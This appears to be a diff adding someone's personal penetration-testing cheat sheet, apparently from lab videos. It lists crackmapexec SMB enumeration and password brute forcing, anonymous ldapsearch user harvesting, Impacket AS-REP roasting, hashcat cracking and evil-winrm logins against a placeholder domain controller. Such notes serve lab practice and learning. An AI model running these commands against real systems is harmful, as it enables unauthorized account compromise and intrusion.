@@ -1,0 +1,135 @@
+
+Just some commands I found while watching IPSec vids & other helpful notes and tips
+
+=================================================
+CRACKMAP for SMB
+================================================
+
+#Get info on their pw policy:
+crackmapexec smb --pass-pol 192.168.99.162
+
+# Null authentication 
+crackmapexec smb  192.168.99.162 -u '' -p ''
+
+# enumerate a DC's users
+crackmapexec smb 192.168.99.162 --users
+
+# discover who's logged on
+crackmapexec smb 192.168.99.162 --loggedon-users
+
+#bruteforce some smb if you can
+crackmapexec smb 192.168.99.162 --rid-brute 4000
+
+crack password of an enumerated user/or Built in
+crackmapexec smb 192.168.99.162 -u Guest -p rockyou.txt
+
+# Brute force
+crackmapexec smb 192.168.99.162 -u 'Administrator' -p 'PASS' --rid-brute
+
+# More fun
+crackmapexec smb 192.168.1.10 -u svc-user -p userspw
+
+
+===================================
+LDAP 
+====================================
+
+#ATTN:  I'm using 192.168.1.10 as a place holder for the actual target IP
+If your on HTB it will be a 10.10.10 IP, but I like the aesthetics of Class C network range.
+
+
+#ldapsearch is a good alternative to enum4linux.
+
+ldapsearch -h <targetIP>  -x
+
+ldapseach -h 192.168.1.10 -x -s base namingcontexts
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" > ldap-anonymous.out
+
+grep -i "memberof" ldap-anonymous.out
+
+less ldap-anonymous.out
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName 
+
+------------------------------------------------------------------------------------------------------------
+Make a user list to use with password list so that you can crack passwords
+-------------------------------------------------------------------------------------------------------------
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
+
+------------------------------------------------------------------------
+IMPACKET Python scripts!
+------------------------------------------------------------------------
+
+Some how-to use of various impacket scripts & hashcat
+IMPACKET & hashcat 
+
+./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/'
+
+
+./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/' -format hashcat
+
+
+#Crack the pw with Hashcat
+Kerberos
+
+./hashcat --example-hashes | grep -i krb
+
+asrep23
+
+create a text doc with the hash
+
+Vim hashes/svc-dude
+
+once you get the dudes pw do
+
+crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw
+
+should log in
+
+crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw --shares
+
+get group policy pw if you can
+
+search the hashes file to get the mode number
+
+./hashcat --example-hashes | less
+
+mode 18200 for asrep
+
+hascat cmd
+
+hashcat -m 18200 hashse/svc-dude  /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule 
+
+-------------------------------------------------------------------------------------------------
+Commands n stuff
+
+instead of grep, try ripgrep
+instead of cat, try bat
+
+when using ripgrep, it's used with the same syntax as grep, except you only have to type rg
+# example
+
+rg -i "chars" file.txt
+
+also can search a directory:
+
+ls -l | rg -i "document"
+
+
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------
+
+winrm 
+
+./evil-winrm.rb -u svc-user -p hispassword -i 192.168.1.10
+
